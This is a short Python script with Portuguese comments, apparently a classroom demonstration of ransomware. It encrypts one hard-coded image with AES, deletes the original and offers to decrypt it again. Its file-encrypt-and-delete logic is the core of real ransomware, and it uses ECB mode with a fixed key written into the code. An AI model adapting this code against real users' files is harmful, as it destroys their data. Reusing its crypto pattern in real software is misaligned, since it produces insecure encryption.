import base64,os
from Crypto.Cipher import AES
from  pyfiglet import figlet_format



actions = [1,2]
print(figlet_format('RANSOMWARE'))
print( '\n \n')

action = input('Press 1 for encrypt\nPress 2 for decrypt\n')


try:
    if int(action) not in actions:
        print('Bye')
        os._exit(0)

except:
    print('Bye')
    os._exit(0)



chave = "FIAP2020fiap2020"     #128, 192, 256 bits
aes = AES.new(chave, AES.MODE_ECB)


if action == '1':

    #abre arquivo
    with open("fiap.jpg", "rb") as arquivo:

        binario = arquivo.read() #le imagem em bin

        dado64 = base64.b64encode(binario) #convert base64

        texto_limpo = dado64.decode('utf-8') #transforma em string

        
        #texto tem que ser multiplo da senha

        quantidadeCaracteres = len(texto_limpo)

        while quantidadeCaracteres % 16 != 0:

            quantidadeCaracteres += 1


        contador = quantidadeCaracteres - len(texto_limpo)
            
        

        for i in range(contador):
            
            texto_limpo = texto_limpo + '0'

    arquivo.close()


    #encripta o conteudo
    texto_cifrado = aes.encrypt(texto_limpo)

    #cria arquivo criptografado
    fileCifrado = open('ImageEncrypt.ransomware', 'wb')
    fileCifrado.write(texto_cifrado)
    fileCifrado.close()


    #cria arquivo com variavel contador
    f = open('counter.txt','w')
    f.write(str(contador))
    f.close()


    #deleta arquivo original
    os.remove(arquivo.name)


    print(arquivo.name, 'criptogradafo')
    print('Execute o script novamente para descriptografar o arquivo',arquivo.name)

    os._exit(0)


else:


    #descriptografar o arquivo

    #procura arquivo com extensao ransomware

    with os.scandir(os.getcwd()) as folder:
        for file in folder:
            if file.name.endswith('ransomware') == True:

                #abre arquivo contador

                c = open('counter.txt', 'r')
                contador = int(c.read())
                c.close()


                f = open(file,'rb')
                texto_cifrado = f.read()


                #dado sujo
                resposta = aes.decrypt(texto_cifrado)[:-contador]

                #retorna o conteudo original

                f = open('fiap.jpg', 'wb')
                f.write(base64.b64decode(resposta))
                f.close()


                os.remove('ImageEncrypt.ransomware')
                os.remove('counter.txt')


                print(file.name, 'descriptografado com sucesso')


    os._exit(0)